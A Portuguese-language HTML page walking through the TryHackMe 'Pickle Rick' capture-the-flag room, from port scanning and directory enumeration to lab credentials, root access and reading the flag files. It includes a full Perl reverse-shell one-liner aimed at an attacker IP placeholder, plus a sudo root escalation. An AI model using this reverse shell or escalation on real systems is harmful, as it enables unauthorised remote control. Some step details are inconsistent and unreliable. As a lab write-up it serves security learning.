<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pickle Rick - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>PICKLE RICK</h1>
            <p class="subtitle">Walkthrough da sala do TryHackMe</p>
        </header>
        
        <section class="intro">
            <h2>Sala Pickle Rick</h2>
            <p>Esta é uma sala de CTF (Capture The Flag) do TryHackMe baseada na série Rick and Morty. O objetivo é ajudar Rick a se transformar de volta em humano encontrando três ingredientes secretos.</p>
            
            <a href="https://tryhackme.com/room/picklerick" target="_blank" class="example-link">
                <i class="fas fa-external-link-alt"></i> Acessar Sala no TryHackMe
            </a>
            
            <div class="highlight">
                <strong>Nota:</strong> Esta sala ensina técnicas de exploração web, execução de comandos e escalação de privilégios.
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sV [IP_DA_MÁQUINA]
                </div>
                
                <div class="highlight">
                    <strong>Resultado do escaneamento:</strong>
                    <ul>
                        <li>Porta 22/tcp: SSH - OpenSSH 7.2p2 Ubuntu</li>
                        <li>Porta 80/tcp: HTTP - Apache httpd 2.4.18 (Ubuntu)</li>
                    </ul>
                </div>
                
                <p>O resultado mostra dois serviços principais: SSH na porta 22 e um servidor web Apache na porta 80.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Investigando o Servidor Web</h3>
                </div>
                <p>Ao acessar o servidor web, encontramos uma página com uma nota importante:</p>
                
                <div class="highlight">
                    <strong>Nota encontrada no código-fonte:</strong>
                    <ul>
                        <li>Username: R1ckRul3s</li>
                    </ul>
                </div>
                
                <p>Também há um painel de comandos que requer autenticação. A senha ainda precisa ser encontrada.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração do Servidor Web</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Enumeração de Diretórios</h3>
                </div>
                <p>Use ferramentas como Gobuster para encontrar diretórios e arquivos ocultos:</p>
                
                <div class="code">
                    gobuster dir -u http://[IP_DA_MÁQUINA]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                </div>
                
                <div class="highlight">
                    <strong>Resultado da enumeração:</strong>
                    <ul>
                        <li>/assets (Status: 301)</li>
                        <li>/server-status (Status: 403)</li>
                        <li>/robots.txt (Status: 200)</li>
                    </ul>
                </div>
                
                <p>O arquivo robots.txt contém uma string interessante que pode ser usada como senha.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Acessando o Painel de Comandos</h3>
                </div>
                <p>Com o username "R1ckRul3s" e a senha encontrada no robots.txt, acesse o painel de comandos:</p>
                
                <div class="highlight">
                    <strong>Credenciais:</strong>
                    <ul>
                        <li>Usuário: R1ckRul3s</li>
                        <li>Senha: Wubbalubbadubdub</li>
                    </ul>
                </div>
                
                <p>O painel de comandos permite executar comandos no sistema.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Obtendo Shell Reverso</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Executando Comandos</h3>
                </div>
                <p>Use o painel de comandos para executar um reverse shell. Primeiro, prepare um listener na sua máquina:</p>
                
                <div class="code">
                    nc -nlvp 1234
                </div>
                
                <p>Execute um reverse shell usando Perl (conforme mostrado no PDF):</p>
                
                <div class="code">
                    perl -e 'use Socket;$i="[SEU_IP]";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
                </div>
                
                <div class="highlight">
                    <strong>Conexão reversa estabelecida:</strong> Shell reverso obtido com sucesso como usuário www-data.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Melhorando o Shell</h3>
                </div>
                <p>Melhore o shell com:</p>

                <div class="code">
                    bash -i
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Buscando os Ingredientes</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Ingredientes</h3>
                </div>
                <p>Procure pelo primeiro ingrediente nos diretórios do usuário:</p>
                
                <div class="code">
                    cd /home <br>
                    ls <br>
                    cd rick <br>
                    ls <br>
                    cat second\ ingredients <br>
                </div>
                
                <div class="highlight">
                    <strong>ingrediente encontrado:</strong> 1 jerry tear
                </div>
            </div>
        
        <section class="section">
            <h2>Escalação de Privilégios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">9</div>
                    <h3>Verificando Privilégios de Sudo</h3>
                </div>
                <p>Verifique quais comandos podem ser executados com sudo:</p>
                
                <div class="code">
                    sudo -l
                </div>
                
                <div class="highlight">
                    <strong>Resultado:</strong>
                    <ul>
                        <li>User www-data may run the following commands on this host:</li>
                        <li>(ALL) NOPASSWD: ALL</li>
                    </ul>
                </div>
                
                <p>Isso significa que podemos executar qualquer comando como root sem precisar de senha.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">10</div>
                    <h3>Obtendo Acesso Root</h3>
                </div>
                <p>Use o sudo para obter um shell como root:</p>
                
                <div class="code">
                    sudo /bin/bash
                </div>
                
                <div class="highlight">
                    <strong>Acesso root obtido:</strong> Agora você tem privilégios completos no sistema.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">11</div>
                    <h3>Terceiro Ingrediente</h3>
                </div>
                <p>Procure pelo terceiro e último ingrediente no diretório root:</p>
                
                <div class="code">
                    cd /root <br>
                    ls <br>
                    cat third_ingredient <br>
                </div>
                
                <div class="highlight">
                    <strong>ingrediente encontrado:</strong> fleeb juice
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos e Técnicas Utilizadas</h2>
            
            <table>
                <tr>
                    <th>Comando/Técnica</th>
                    <th>Descrição</th>
                    <th>Propósito</th>
                </tr>
                <tr>
                    <td><code>nmap -sV</code></td>
                    <td>Escaneamento de versões de serviços</td>
                    <td>Identificar serviços em execução</td>
                </tr>
                <tr>
                    <td><code>gobuster dir</code></td>
                    <td>Enumeração de diretórios web</td>
                    <td>Encontrar paths ocultos</td>
                </tr>
                <tr>
                    <td>Reverse Shell Perl</td>
                    <td>Exploração de execução de comandos</td>
                    <td>Obter shell reverso</td>
                </tr>
                <tr>
                    <td><code>sudo -l</code></td>
                    <td>Listar privilégios sudo</td>
                    <td>Identificar vetores de escalação</td>
                </tr>
                <tr>
                    <td><code>sudo /bin/bash</code></td>
                    <td>Exploração de privilégios sudo</td>
                    <td>Escalar privilégios para root</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo da Exploração</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-search"></i>
                        </div>
                        <h3>Reconhecimento</h3>
                    </div>
                    <div class="card-content">
                        <p>Escaneamento de portas e enumeração web revelaram serviços e informações importantes no código-fonte.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-terminal"></i>
                        </div>
                        <h3>Exploração</h3>
                    </div>
                    <div class="card-content">
                        <p>Painel de comandos explorado com reverse shell para obter acesso ao sistema.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-crown"></i>
                        </div>
                        <h3>Escalação</h3>
                    </div>
                    <div class="card-content">
                        <p>Privilégios sudo explorados para obter acesso root e encontrar todos os ingredientes.</p>
                    </div>
                </div>
            </div>
            
        </section>
        
        <footer>
            <p>Pickle Rick do TryHackMe - Walkthrough</p>
        </footer>
    </div>
</body>
</html>